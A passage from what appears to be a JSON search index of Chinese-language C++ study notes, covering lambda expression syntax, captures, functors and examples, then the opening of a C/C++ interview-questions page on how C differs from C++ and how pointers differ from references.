\u76f8\u540c\uff0c\u4f46\u6307\u5b9a\u6cdb\u578b lambda \u5e76\u663e\u5f0f\u63d0\u4f9b\u6a21\u677f\u5f62\u53c2\u5217\u8868\u3002","title":"\u8bed\u6cd5"},{"location":"cplusplus/lambda/#explanation","text":"captures - \u5305\u542b\u96f6\u6216\u66f4\u591a\u4e2a \u6355\u83b7\u7b26 \u7684\u9017\u53f7\u5206\u9694\u5217\u8868\uff0c\u53ef\u4ee5 \u9ed8\u8ba4\u6355\u83b7\u7b26\uff08capture-default\uff09 \u8d77\u59cb\u3002 \u6709\u5173\u6355\u83b7\u7b26\u7684\u8be6\u7ec6\u63cf\u8ff0\uff0c\u89c1 \u4e0b\u6587 \u3002 \u5982\u679c\u53d8\u91cf\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\uff0c\u90a3\u4e48 lambda \u8868\u8fbe\u5f0f\u5728\u4f7f\u7528\u5b83\u524d\u4e0d\u9700\u8981\u5148\u6355\u83b7\uff1a \u8be5\u53d8\u91cf\u662f\u975e\u5c40\u90e8\u53d8\u91cf\uff0c\u6216\u5177\u6709\u9759\u6001\u6216\u7ebf\u7a0b\u5c40\u90e8 \u5b58\u50a8\u671f \uff08\u6b64\u65f6\u65e0\u6cd5\u6355\u83b7\u8be5\u53d8\u91cf\uff09\uff0c\u6216\u8005 \u8be5\u53d8\u91cf\u662f\u4ee5 \u5e38\u91cf\u8868\u8fbe\u5f0f \u521d\u59cb\u5316\u7684\u5f15\u7528\u3002 \u5982\u679c\u53d8\u91cf\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\uff0c\u90a3\u4e48 lambda \u8868\u8fbe\u5f0f\u5728\u8bfb\u53d6\u5b83\u7684\u503c\u524d\u4e0d\u9700\u8981\u5148\u6355\u83b7\uff1a \u8be5\u53d8\u91cf\u5177\u6709 const \u800c\u975e volatile \u7684\u6574\u578b\u6216\u679a\u4e3e\u7c7b\u578b\uff0c\u5e76\u5df2\u7ecf\u7528 \u5e38\u91cf\u8868\u8fbe\u5f0f \u521d\u59cb\u5316\uff0c\u6216\u8005 \u8be5\u53d8\u91cf\u662f constexpr \u7684\u4e14\u6ca1\u6709 mutable \u6210\u5458\u3002 tparams - \uff08\u89d2\u62ec\u53f7\u4e2d\u7684\uff09\u6a21\u677f\u5f62\u53c2\u5217\u8868\uff0c\u7528\u4e8e\u4e3a\u6cdb\u578b lambda \u63d0\u4f9b\u5404\u6a21\u677f\u5f62\u53c2\u7684\u540d\u5b57\uff08\u89c1\u4e0b\u6587\u7684 ClosureType::operator()\uff09\u3002\u4e0e\u5728\u6a21\u677f\u58f0\u660e\u4e2d\u76f8\u4f3c\uff0c\u6a21\u677f\u5f62\u53c2\u5217\u8868\u53ef\u4ee5\u540e\u9644 requires \u5b50\u53e5\uff0c\u5b83\u6307\u5b9a\u5404\u6a21\u677f\u5b9e\u53c2\u4e0a\u7684 \u7ea6\u675f \u3002 \u6a21\u677f\u5f62\u53c2\u5217\u8868\u4e0d\u80fd\u4e3a\u7a7a\uff08\u4e0d\u5141\u8bb8 <>\uff09\u3002 params - \u5f62\u53c2\u5217\u8868\uff0c\u5982\u5728 \u5177\u540d\u51fd\u6570 \u4e2d\u3002 specs - \u7531 specifiers \u3001 exception \u3001 attr \u548c trailing-return-type \u6309\u987a\u5e8f\u7ec4\u6210\uff0c\u6bcf\u4e2a\u7ec4\u5206\u5747\u975e\u5fc5\u9700 specifiers - \u53ef\u9009\u7684\u8bf4\u660e\u7b26\u7684\u5e8f\u5217\u3002\u4e0d\u63d0\u4f9b\u8bf4\u660e\u7b26\u65f6\u590d\u5236\u6355\u83b7\u7684\u5bf9\u8c61\u5728 lambda \u51fd\u6570\u4f53\u5185\u662f const \u7684\u3002\u53ef\u4ee5\u4f7f\u7528\u4e0b\u5217\u8bf4\u660e\u7b26\uff1a mutable: \u5141\u8bb8 \u51fd\u6570\u4f53 \u4fee\u6539\u590d\u5236\u6355\u83b7\u7684\u5bf9\u8c61\uff0c\u4ee5\u53ca\u8c03\u7528\u5b83\u4eec\u7684\u975e const \u6210\u5458\u51fd\u6570 constexpr: \u663e\u5f0f\u6307\u5b9a\u51fd\u6570\u8c03\u7528\u8fd0\u7b97\u7b26\u6216\u8fd0\u7b97\u7b26\u6a21\u677f\u7684\u4efb\u610f\u7279\u5316\u4e3a constexpr \u51fd\u6570\u3002\u5982\u679c\u6ca1\u6709\u6b64\u8bf4\u660e\u7b26\u4f46\u51fd\u6570\u8c03\u7528\u8fd0\u7b97\u7b26\u6216\u4efb\u610f\u7ed9\u5b9a\u7684\u8fd0\u7b97\u7b26\u6a21\u677f\u7279\u5316\u6070\u597d\u6ee1\u8db3\u9488\u5bf9 constexpr \u51fd\u6570\u7684\u6240\u6709\u8981\u6c42\uff0c\u90a3\u4e48\u5b83\u4e5f\u4f1a\u662f constexpr \u7684\u3002 (C++17 \u8d77) consteval\uff1a\u6307\u5b9a\u51fd\u6570\u8c03\u7528\u8fd0\u7b97\u7b26\u6216\u4efb\u610f\u7ed9\u5b9a\u7684\u8fd0\u7b97\u7b26\u6a21\u677f\u7279\u5316\u4e3a \u7acb\u5373\u51fd\u6570 \u3002\u4e0d\u80fd\u540c\u65f6\u4f7f\u7528 consteval \u548c constexpr\u3002 (C++20 \u8d77) exception - \u4e3a\u95ed\u5305\u7c7b\u578b\u7684 operator() \u63d0\u4f9b \u52a8\u6001\u5f02\u5e38\u8bf4\u660e \u6216 (C++20 \u524d) noexcept \u8bf4\u660e\u7b26 attr - \u4e3a\u95ed\u5305\u7c7b\u578b\u7684\u51fd\u6570\u8c03\u7528\u8fd0\u7b97\u7b26\u6216\u8fd0\u7b97\u7b26\u6a21\u677f\u7684\u7c7b\u578b\u63d0\u4f9b \u5c5e\u6027\u8bf4\u660e \u3002\u8fd9\u6837\u6307\u5b9a\u7684\u4efb\u4f55\u5c5e\u6027\u5747\u5c5e\u4e8e\u51fd\u6570\u8c03\u7528\u8fd0\u7b97\u7b26\u6216\u8fd0\u7b97\u7b26\u6a21\u677f\u7684\u7c7b\u578b\uff0c\u800c\u975e\u5176\u81ea\u8eab\u3002\uff08\u4f8b\u5982\u4e0d\u80fd\u4f7f\u7528 [[ noreturn ]]\uff09 trailing-return-type - -> \u8fd4\u56de\u7c7b\u578b \uff0c\u5176\u4e2d \u8fd4\u56de\u7c7b\u578b \u6307\u5b9a\u8fd4\u56de\u7c7b\u578b\u3002\u5982\u679c\u6ca1\u6709 \u5c3e\u968f\u8fd4\u56de\u7c7b\u578b \uff0c\u90a3\u4e48\u95ed\u5305\u7684 operator() \u7684\u8fd4\u56de\u7c7b\u578b\u4ece return \u8bed\u53e5\u63a8\u5bfc\uff0c\u5982\u540c\u5bf9\u4e8e\u58f0\u660e\u8fd4\u56de\u7c7b\u578b\u4e3a auto \u7684\u51fd\u6570\u7684\u63a8\u5bfc\u4e00\u6837\u3002 requires - (C++20 \u8d77)\u5411\u95ed\u5305\u7c7b\u578b\u7684 operator() \u6dfb\u52a0 \u7ea6\u675f body - \u51fd\u6570\u4f53 \u5f53\u4ee5 auto \u4e3a\u5f62\u53c2\u7c7b\u578b\u6216\u663e\u5f0f\u63d0\u4f9b\u6a21\u677f\u5f62\u53c2\u5217\u8868 (C++20 \u8d77)\u65f6\uff0c\u8be5 lambda \u662f\u6cdb\u578b lambda\u3002(C++14 \u8d77)","title":"\u89e3\u91ca"},{"location":"cplusplus/lambda/#lambda-captures","text":"\u6355\u83b7 \u662f\u4e00\u4e2a\u542b\u6709\u96f6\u6216\u66f4\u591a\u4e2a\u6355\u83b7\u7b26\u7684\u9017\u53f7\u5206\u9694\u5217\u8868\uff0c\u53ef\u4ee5 \u9ed8\u8ba4\u6355\u83b7\u7b26 \u5f00\u59cb\u3002\u9ed8\u8ba4\u6355\u83b7\u7b26\u53ea\u6709 &\uff08\u4ee5\u5f15\u7528\u9690\u5f0f\u6355\u83b7\u88ab\u4f7f\u7528\u7684\u81ea\u52a8\u53d8\u91cf\uff09\u548c =\uff08\u4ee5\u590d\u5236\u9690\u5f0f\u6355\u83b7\u88ab\u4f7f\u7528\u7684\u81ea\u52a8\u53d8\u91cf\uff09\u3002 \u5f53\u51fa\u73b0\u4efb\u4e00\u9ed8\u8ba4\u6355\u83b7\u7b26\u65f6\uff0c\u90fd\u80fd\u9690\u5f0f\u6355\u83b7\u5f53\u524d\u5bf9\u8c61\uff08 *this \uff09\u3002\u82e5\u9690\u5f0f\u6355\u83b7\u5b83\uff0c\u5219\u59cb\u7ec8\u4ee5\u5f15\u7528\u6355\u83b7\uff0c\u5373\u4f7f\u9ed8\u8ba4\u6355\u83b7\u7b26\u662f =\u3002\u5f53\u9ed8\u8ba4\u6355\u83b7\u7b26\u4e3a = \u65f6\uff0c *this \u7684\u9690\u5f0f\u6355\u83b7\u88ab\u5f03\u7528\u3002 (C++20 \u8d77) \u6355\u83b7 \u4e2d\u5355\u72ec\u7684\u6355\u83b7\u7b26\u7684\u8bed\u6cd5\u662f: \u6807\u8bc6\u7b26 (1) \u6807\u8bc6\u7b26 ... (2) \u6807\u8bc6\u7b26 \u521d\u59cb\u5316\u5668 (3) (C++14 \u8d77) & \u6807\u8bc6\u7b26 (4) & \u6807\u8bc6\u7b26 ... (5) & \u6807\u8bc6\u7b26 \u521d\u59cb\u5316\u5668 (6) (C++14 \u8d77) this (7) * this (8) (C++17 \u8d77) ... \u6807\u8bc6\u7b26 \u521d\u59cb\u5316\u5668 (9) (C++20 \u8d77) & ... \u6807\u8bc6\u7b26 \u521d\u59cb\u5316\u5668 (10) (C++20 \u8d77) \u7b80\u5355\u7684\u4ee5\u590d\u5236\u6355\u83b7 \u4f5c\u4e3a\u5305\u5c55\u5f00\u7684\u7b80\u5355\u7684\u4ee5\u590d\u5236\u6355\u83b7 \u5e26\u521d\u59cb\u5316\u5668\u7684\u4ee5\u590d\u5236\u6355\u83b7 \u7b80\u5355\u7684\u4ee5\u5f15\u7528\u6355\u83b7 \u4f5c\u4e3a\u5305\u5c55\u5f00\u7684\u7b80\u5355\u7684\u4ee5\u5f15\u7528\u6355\u83b7 \u5e26\u521d\u59cb\u5316\u5668\u7684\u4ee5\u5f15\u7528\u6355\u83b7 \u5f53\u524d\u5bf9\u8c61\u7684\u7b80\u5355\u7684\u4ee5\u5f15\u7528\u6355\u83b7 \u5f53\u524d\u5bf9\u8c61\u7684\u7b80\u5355\u7684\u4ee5\u590d\u5236\u6355\u83b7 \u521d\u59cb\u5316\u5668\u4e3a\u5305\u5c55\u5f00\u7684\u4ee5\u590d\u5236\u6355\u83b7 \u521d\u59cb\u5316\u5668\u4e3a\u5305\u5c55\u5f00\u7684\u4ee5\u5f15\u7528\u6355\u83b7 \u5f53\u9ed8\u8ba4\u6355\u83b7\u7b26\u662f & \u65f6\uff0c\u540e\u7ee7\u7684\u7b80\u5355\u6355\u83b7\u7b26\u4e0d\u80fd\u4ee5 & \u5f00\u59cb\u3002 struct S2 { void f(int i); }; void S2::f(int i) { [&]{}; // OK\uff1a\u9ed8\u8ba4\u4ee5\u5f15\u7528\u6355\u83b7 [&, i]{}; // OK\uff1a\u4ee5\u5f15\u7528\u6355\u83b7\uff0c\u4f46 i \u4ee5\u503c\u6355\u83b7 [&, &i] {}; // \u9519\u8bef\uff1a\u4ee5\u5f15\u7528\u6355\u83b7\u4e3a\u9ed8\u8ba4\u65f6\u7684\u4ee5\u5f15\u7528\u6355\u83b7 [&, this] {}; // OK\uff1a\u7b49\u4ef7\u4e8e [&] [&, this, i]{}; // OK\uff1a\u7b49\u4ef7\u4e8e [&, i] } \u5f53\u9ed8\u8ba4\u6355\u83b7\u7b26\u662f = \u65f6\uff0c\u540e\u7ee7\u7684\u7b80\u5355\u6355\u83b7\u7b26\u5fc5\u987b\u4ee5 & \u5f00\u59cb\uff0c\u6216\u8005\u4e3a *this (C++17 \u8d77) \u6216 this (C++20 \u8d77)\u3002 struct S2 { void f(int i); }; void S2::f(int i) { [=]{}; // OK\uff1a\u9ed8\u8ba4\u4ee5\u590d\u5236\u6355\u83b7 [=, &i]{}; // OK\uff1a\u4ee5\u590d\u5236\u6355\u83b7\uff0c\u4f46 i \u4ee5\u5f15\u7528\u6355\u83b7 [=, *this]{}; // C++17 \u524d\uff1a\u9519\u8bef\uff1a\u65e0\u6548\u8bed\u6cd5 // C++17 \u8d77\uff1aOK\uff1a\u4ee5\u590d\u5236\u6355\u83b7\u5916\u56f4\u7684 S2 [=, this] {}; // C++20 \u524d\uff1a\u9519\u8bef\uff1a= \u4e3a\u9ed8\u8ba4\u65f6\u7684 this // C++20 \u8d77\uff1aOK\uff1a\u540c [=] } \u4efb\u4f55\u6355\u83b7\u7b26\u53ea\u53ef\u4ee5\u51fa\u73b0\u4e00\u6b21\uff1a struct S2 { void f(int i); }; void S2::f(int i) { [i, i] {}; // \u9519\u8bef\uff1ai \u91cd\u590d [this, *this] {}; // \u9519\u8bef\uff1a\"this\" \u91cd\u590d (C++17) }","title":"Lambda \u6355\u83b7"},{"location":"cplusplus/lambda/#functor","text":"\u5728C++11\u4e4b\u524d\uff0cSTL\u4e2d\u7684\u4e00\u4e9b\u7b97\u6cd5\u9700\u8981\u4f7f\u7528\u4e00\u79cd\u51fd\u6570\u5bf9\u8c61---\u4eff\u51fd\u6570(functor)\uff1b\u5176\u672c\u8d28\u662f\u91cd\u65b0\u5b9a\u4e49\u548c\u6210\u5458\u51fd\u6570 operator() \uff0c\u4f7f\u5176\u4f7f\u7528\u4e0a\u5f88\u50cf\u666e\u901a\u51fd\u6570\uff0c\u5176\u5b9e\uff0c\u7ec6\u5fc3\u7684\u6211\u4eec\u5df2\u7ecf\u53d1\u73b0\uff0cLambda\u51fd\u6570\u4e0e\u4eff\u51fd\u6570\u4f3c\u4e4e\u6709\u4e00\u4e9b\u9ed8\u5951\u3002 \u5982\u4e0b\u4f8b\u5b50\uff1a\u6298\u6263 class Price { private: float _rate; public: Price(float rate):_rate(rate){} float operator()(float price) { return price*(1 - _rate / 100); } }; int main(int argc, char* argv[]) { float rate=5.5f; Price c1(rate); auto c2 = [rate](float price)->float {return price*(1 - rate / 100); }; float p1 = c1(3699); //\u4eff\u51fd\u6570 float p2 = c2(3699); //Lambda\u51fd\u6570 return 0; } \u4eff\u51fd\u6570\u4ee5rate\u521d\u59cb\u5316,Lambda\u6355\u6349rate\u53d8\u91cf\uff0c\u53c2\u6570\u4f20\u9012\u4e0a\uff0c\u4e24\u8005\u4e00\u81f4\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u4eff\u51fd\u6570\u5c31\u662f\u5b9e\u73b0Lambda\u51fd\u6570\u4e00\u79cd\u65b9\u5f0f\uff0c\u7f16\u8bd1\u5668\u901a\u5e38\u4f1a\u628aLambda\u51fd\u6570\u8f6c\u6362\u4e3a\u4e00\u4e2a\u4eff\u51fd\u6570\u5bf9\u8c61\uff0c\u4f46\u662f\u4eff\u51fd\u6570\u7684\u8bed\u6cd5\u5374\u7ed9\u6211\u4eec\u5e26\u6765\u4e86\u5f88\u5927\u7684\u4fbf\u6377\u3002 \u5728C++11\u4e2d\uff0cLambda\u51fd\u6570\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u5f88\u591a\u4eff\u51fd\u6570\u88ab\u53d6\u4ee3\u3002","title":"\u4eff\u51fd\u6570"},{"location":"cplusplus/lambda/#examples","text":"int main(int argc, char* argv[]) { int a = 5, b = 7; auto total = [](int x, int y)->int {return x + y; }; //\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570 cout << total(a, b)<<endl; //12 auto fun1 = [=] {return a + b; }; //\u503c\u4f20\u9012\u6355\u6349\u7236\u4f5c\u7528\u57df\u53d8\u91cf cout << fun1() << endl; //12 auto fun2 = [&](int c) {b = a + c; a = 1; }; //\u7701\u7565\u4e86\u8fd4\u56de\u503c\u7c7b\u578b\uff0c\u5f15\u7528\u6355\u83b7\u6240\u6709 fun2(3); cout << a <<\" \"<< b << endl; //1 8 a = 5; b = 7; //\u88ab\u4fee\u6539\u540e\uff0c\u91cd\u65b0\u8d4b\u503c auto fun3 = [=, &b](int c) mutable {b = a + c; a = 1; }; //\u4ee5\u503c\u4f20\u9012\u6355\u6349\u7684\u53d8\u91cf\uff0c\u5728\u51fd\u6570\u4f53\u91cc\u5982\u679c\u8981\u4fee\u6539\uff0c\u8981\u52a0mutaple,\u56e0\u4e3a\u9ed8\u8ba4const\u4fee\u9970 fun3(3); cout << a << \" \" <<b<< endl; //5 8 a = 5; b = 7; //\u88ab\u4fee\u6539\u540e\uff0c\u91cd\u65b0\u8d4b\u503c auto fun4 = [=](int x, int y) mutable->int {a += x; b += y; return a + b; }; int t = fun4(10, 20); cout << t << endl; //42 cout << a <<\" \"<< b << endl; //5 7 return 0; } \u5757\u4f5c\u7528\u57df\u4ee5\u5916\u7684Lambda\u51fd\u6570\u6355\u6349\u5217\u8868\u5fc5\u987b\u4e3a\u7a7a\uff0c\u56e0\u6b64\u8fd9\u6837\u7684\u51fd\u6570\u9664\u4e86\u8bed\u6cd5\u4e0a\u7684\u4e0d\u540c\uff0c\u548c\u666e\u901a\u51fd\u6570\u533a\u522b\u4e0d\u5927\u3002 \u5757\u4f5c\u7528\u57df\u4ee5\u5185\u7684Lambda\u51fd\u6570\u4ec5\u80fd\u6355\u6349\u5757\u4f5c\u7528\u57df\u4ee5\u5185\u7684\u81ea\u52a8\u53d8\u91cf\uff0c\u6355\u6349\u4efb\u4f55\u975e\u6b64\u4f5c\u7528\u57df\u6216\u975e\u81ea\u52a8\u53d8\u91cf(\u9759\u6001\u53d8\u91cf)\uff0c\u90fd\u4f1a\u5f15\u8d77\u7f16\u8bd1\u5668\u62a5\u9519\u3002 \u4e0b\u9762\u793a\u4f8b\u6f14\u793a\u5982\u4f55\u4f20\u9012 lambda \u7ed9\u6cdb\u578b\u7b97\u6cd5\uff0c\u4ee5\u53ca lambda \u8868\u8fbe\u5f0f\u6240\u4ea7\u751f\u7684\u5bf9\u8c61\u80fd\u5982\u4f55\u5b58\u50a8\u4e8e std::function \u5bf9\u8c61\u3002 #include <vector> #include <iostream> #include <algorithm> #include <functional> int main() { std::vector<int> c = {1, 2, 3, 4, 5, 6, 7}; int x = 5; c.erase(std::remove_if(c.begin(), c.end(), [x](int n) { return n < x; }), c.end()); std::cout << \"c: \"; std::for_each(c.begin(), c.end(), [](int i){ std::cout << i << ' '; }); std::cout << '\\n'; // the type of a closure cannot be named, but can be inferred with auto // since C++14, lambda could own default arguments auto func1 = [](int i = 6) { return i + 4; }; std::cout << \"func1: \" << func1() << '\\n'; // like all callable objects, closures can be captured in std::function // (this may incur unnecessary overhead) std::function<int(int)> func2 = [](int i) { return i + 4; }; std::cout << \"func2: \" << func2(6) << '\\n'; constexpr int fib_max {8}; std::cout << \"Emulate `recursive lambda` calls:\\nFibonacci numbers: \"; auto nth_fibonacci = [](int n) { std::function<int(int, int, int)> fib = [&](int n, int a, int b) { return n ? fib(n - 1, a + b, a) : b; }; return fib(n, 0, 1); }; for (int i{1}; i <= fib_max; ++i) { std::cout << nth_fibonacci(i) << (i < fib_max ? \", \" : \"\\n\"); } std::cout << \"Alternative approach to lambda recursion:\\nFibonacci numbers: \"; auto nth_fibonacci2 = [](auto self, int n, int a = 0, int b = 1) -> int { return n ? self(self, n - 1, a + b, a) : b; }; for (int i{1}; i <= fib_max; ++i) { std::cout << nth_fibonacci2(nth_fibonacci2, i) << (i < fib_max ? \", \" : \"\\n\"); } #ifdef __cpp_explicit_this_parameter std::cout << \"C++23 approach to lambda recursion:\\n\"; auto nth_fibonacci3 = [](this auto self, int n, int a = 0, int b = 1) { return n ? self(n - 1, a + b, a) : b; }; for (int i{1}; i <= fib_max; ++i) { std::cout << nth_fibonacci3(i) << (i < fib_max ? \", \" : \"\\n\"); } #endif } Possible output: c: 5 6 7 func1: 10 func2: 10 Emulate `recursive lambda` calls: Fibonacci numbers: 0, 1, 1, 2, 3, 5, 8, 13 Alternative approach to lambda recursion: Fibonacci numbers: 0, 1, 1, 2, 3, 5, 8, 13","title":"\u793a\u4f8b"},{"location":"cplusplus/lambda/#references","text":"Lambda expressions: https://en.cppreference.com/w/cpp/language/lambda Lambda expressions: https://zh.cppreference.com/w/cpp/language/lambda","title":"\u53c2\u8003\u8d44\u6599"},{"location":"cplusplus/questions/","text":"C/C++ \u5e38\u89c1\u9762\u8bd5\u9898 \uf0c1 \u672c\u4eba\u603b\u7ed3\u7684\u5e38\u89c1\u9762\u8bd5\u9898 C \u548c C++ \u7684\u533a\u522b \uf0c1 \u9664\u4e86\u9762\u5411\u5bf9\u8c61\u4e0e\u9762\u5411\u8fc7\u7a0b\u8fd9\u4e2a\u56de\u7b54\u4e4b\u5916\uff0cC \u4e0e C++ \u7684\u771f\u6b63\u533a\u522b\u5728\u54ea\u91cc\uff1f \u8fd9\u51e0\u5e74\u4e0d\u7ba1\u662f\u793e\u56e2\u5b9e\u4e60\u5de5\u4f5c\u9762\u8bd5\u90fd\u6709\u88ab\u95ee\u5230\u8fd9\u4e2a\u95ee\u9898\u3002\u4f46\u662f\u300c\u9762\u5411\u5bf9\u8c61\u4ee5\u53ca\u9762\u5411\u8fc7\u7a0b\u300d\u8fd9\u4e2a\u56de\u7b54\u4f3c\u4e4e\u90fd\u4e0d\u662f\u6700\u597d\u6216\u8005\u6700\u5b8c\u5584\u7684\u7b54\u6848\u3002 \u6240\u4ee5\u8fd9\u4e2a\u95ee\u9898\u6839\u672c\u6ca1\u6709\u7b80\u5355\u7684\u7b54\u6848\uff0c\u90093\u4e2a\u89d2\u5ea6\u8c08\u5c31\u80fd\u51993\u7bc7\u8bba\u6587\u3002\u7b80\u5355\u8bf4\u8bf4\u51e0\u4e2a\u5e38\u89c1\u7684\u8bef\u533a\u3002 \u8bef\u533a1\uff1aC++\u662f\u9762\u5411\u5bf9\u8c61\u7684C\uff1f\u5e76\u4e0d\u662f\u3002\u73b0\u4ee3C++\u662f\u81f3\u5c11\u56db\u79cd\u7f16\u7a0b\u8303\u5f0f\u7684\u96c6\u5408\u4f53\uff08\u9762\u5411\u8fc7\u7a0b\uff0c\u9762\u5411\u5bf9\u8c61\uff0c\u6cdb\u578b\u7f16\u7a0b\u548c\u5143\u7f16\u7a0b\uff0c\u51fd\u6570\u5f0f\u7f16\u7a0b\u7b49\uff0c\u5b9e\u9645\u53ef\u80fd\u4e0d\u6b624\u79cd\uff09\u3002\u8bf4C++\u662f\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff0c\u662f\u4e00\u79cd\u5f88\u77a7\u4e0d\u8d77C++\u7684\u8bf4\u6cd5\uff0c\u56e0\u4e3a\u9762\u5411\u5bf9\u8c61\u4ec5\u4ec5\u662fC++\u7684\u591a\u79cd\u8303\u5f0f\u4e4b\u4e00\u3002 \u8bef\u533a2\uff1aC\u662f\u9762\u5411\u8fc7\u7a0b\u8bed\u8a00\uff1f\u4e0d\u80fd\u8fd9\u4e48\u8bf4\u3002\u5728\u9762\u5411\u5bf9\u8c61\u65b9\u9762\uff0cC\u8bed\u8a00\u63d0\u4f9b\u7684\u8bed\u6cd5\u652f\u6301\u6bd4\u8f83\u8584\u5f31\uff0c\u4f46\u8fd9\u4e0d\u8868\u793aC\u662f\u9762\u5411\u8fc7\u7a0b\u7684\u8bed\u8a00\u3002\u7528C\u8bed\u8a00\u5199\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u4e0d\u4ec5\u4e0d\u5f31\uff0c\u751a\u81f3\u4f1a\u6709\u4e00\u4e9b\u4f18\u52bf\u3002\u4e16\u754c\u4e0a\u6709\u5f88\u591a\u975e\u5e38\u91cd\u8981\u7684\u3001\u5927\u91cf\u4f7f\u7528\u9762\u5411\u5bf9\u8c61\u6280\u672f\u7684\u8f6f\u4ef6\u662f\u7528\u7eafC\u5199\u7684\u3002\u4f8b\u5982Linux\u7684\u56fe\u5f62\u754c\u9762GNOME\u3002 \u8bef\u533a3\uff1aC\u662fC++\u7684\u5b50\u96c6\uff0cC\u652f\u6301\u7684\u8bed\u6cd5C++\u90fd\u652f\u6301\u3002\u4e0d\u5bf9\u3002C++\u5728\u6700\u521d\u8bbe\u8ba1\u65f6\u662f\u57fa\u4e8eC\u7684\uff0c\u7edd\u5927\u591a\u6570\u8bed\u6cd5\u90fd\u517c\u5bb9\u3002\u4f46\u662f\uff0c\u5728\u4e00\u4e9b\u7ec6\u8282\u5374\u91cd\u8981\u7684\u5730\u65b9\uff0c\u4e8c\u8005\u5dee\u522b\u975e\u5e38\u5927\u3002\u4f8b\u5982\uff0cC\u8bed\u8a00\u7684\u51fd\u6570\u6307\u9488\u975e\u5e38\u795e\u5947\uff1a int (*pfunc)(); \u770b\u4e0a\u53bbpfunc\u53ef\u4ee5\u6307\u5411\u8fd4\u56de\u503c\u4e3aint\uff0c\u65e0\u53c2\u6570\u7684\u51fd\u6570\uff1f\u5e76\u4e0d\u662f\u3002\u5b9e\u9645\u4e0apfunc\u53ef\u4ee5\u6307\u5411\u4efb\u610f\u8fd4\u56de\u503c\u4e3aint\u7684\u51fd\u6570\uff0c\u65e0\u8bba\u53c2\u6570\u662f\u4ec0\u4e48\u3002\u800c\u65e0\u53c2\u7684\u60c5\u51b5\u5fc5\u987b\u5199\u660e\u53c2\u6570\u4e3avoid\uff1a int (*pfunc)(void); C\u8bed\u8a00\u4e0d\u5fc5\u6307\u5b9a\u53c2\u6570\u7c7b\u578b\u4e5f\u53ef\u4ee5\u5f15\u7528\u51fd\u6570\uff0c\u8fd9\u4e00\u70b9\u8ba9C\u8bed\u8a00\u5177\u6709\u5f88\u5f3a\u7684\u52a8\u6001\u7279\u6027\u3002\u800cC++\u53bb\u9664\u4e86\u8fd9\u79cd\u8bbe\u8ba1\uff0c\u56e0\u4e3a\u7834\u574f\u4e86\u7c7b\u578b\u5b89\u5168\u3002\u540c\u7406\uff0cC\u8bed\u8a00\u5e38\u7528\u7684(void*)\u8f6c\u6362\u5728C++\u4e2d\u4e5f\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u6452\u5f03\u4e86\uff0c\u7406\u7531\u4e5f\u662f\u7c7b\u578b\u4e0d\u5b89\u5168\u3002\u54ea\u4e2a\u8bbe\u8ba1\u597d\u54ea\u4e2a\u4e0d\u597d\u4e0d\u91cd\u8981\u3002\u91cd\u8981\u7684\u662f\uff1aC\u5e76\u4e0d\u662fC++\u7684\u5b50\u96c6\uff0cC++\u4e5f\u4e0d\u662fC\u7684\u8d85\u96c6\u3002\u5b83\u4eec\u5728\u8bed\u6cd5\u3001\u8bbe\u8ba1\u7406\u5ff5\u3001\u5e38\u7528\u5199\u6cd5\u65b9\u9762\u5747\u6709\u4e0d\u540c\uff0c\u5230\u4eca\u5929\u4e8c\u8005\u7684\u5dee\u522b\u8d8a\u6765\u8d8a\u5927\u3002 \u8bef\u533a4\uff1aC++\u6bd4C\u529f\u80fd\u591a\uff0c\u6240\u4ee5C++\u8fd0\u884c\u6bd4C\u6162\u4e00\u70b9\u3002\u4e0d\u5bf9\u3002\u867d\u7136C++\u52a0\u5165\u4e86\u5f88\u591a\u5f88\u591a\u529f\u80fd\uff0c\u4f46\u7531\u4e8e\u7edd\u5927\u591a\u6570\u529f\u80fd\u90fd\u662f\u5728\u7f16\u8bd1\u5668\u4e0a\u505a\u624b\u811a\uff0c\u5927\u591a\u60c5\u51b5\u4e0b\u4ec5\u5f71\u54cd\u7f16\u8bd1\u901f\u5ea6\uff0c\u800c\u4e0d\u5f71\u54cd\u8fd0\u884c\u901f\u5ea6\u3002\u800c\u4e14\u6cdb\u578b\u3001\u5143\u7f16\u7a0b\u7b49\u6280\u672f\u7528\u597d\u4e86\uff0c\u80fd\u8ba9C++\u7684\u7a0b\u5e8f\u8fd0\u884c\u7684\u66f4\u5feb\u3002\u53cd\u800c\u662fC\uff0c\u7531\u4e8e\u5927\u91cf\u4f7f\u7528\u4e0d\u5b9a\u7c7b\u578b\u7684\u8f6c\u6362\uff0c\u635f\u5931\u7684\u6027\u80fd\u76f8\u5f53\u53ef\u89c2\u3002 \u603b\u4e4b\uff0cC\u4e0eC++\u7684\u533a\u522b\u8fdc\u4e0d\u662f\u4e00\u6bb5\u8bdd\u80fd\u591f\u8bb2\u6e05\u695a\u3002 \u6307\u9488\u548c\u5f15\u7528\u7684\u533a\u522b \uf0c1 \u6307\u9488\u662f\u4e00\u4e2a\u53d8\u91cf\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u4e2a\u53d8\u91cf\u5b58\u50a8\u7684\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u6307\u5411\u5185\u5b58\u7684\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\uff1b\u800c\u5f15\u7528\u8ddf\u539f\u6765\u7684\u53d8\u91cf\u5b9e\u8d28\u4e0a\u662f\u540c\u4e00\u4e2a\u4e1c\u897f\uff0c\u53ea\u4e0d\u8fc7\u662f\u539f\u53d8\u91cf\u7684\u4e00\u4e2a\u522b\u540d\u800c\u5df2\u3002\"sizeof\u5f15\u7528\"\u5f97\u5230\u7684\u662f\u6240\u6307\u5411\u7684\u53d8\u91cf(\u5bf9\u8c61)\u7684\u5927\u5c0f\uff0c\u800c\"sizeof\u6307\u9488\"\u5f97\u5230\u7684\u662f\u6307\u9488\u672c\u8eab\u7684\u5927\u5c0f\uff1b \u5f15\u7528\u5fc5\u987b\u88ab\u521d\u59cb\u5316\uff0c\u6307\u9488\u4e0d\u5fc5\u3002 \u5f15\u7528\u521d\u59cb\u5316\u4ee5\u540e\u4e0d\u80fd\u88ab\u6539\u53d8\uff0c\u6307\u9488\u53ef\u4ee5\u6539\u53d8\u6240\u6307\u7684\u5bf9\u8c61\u3002 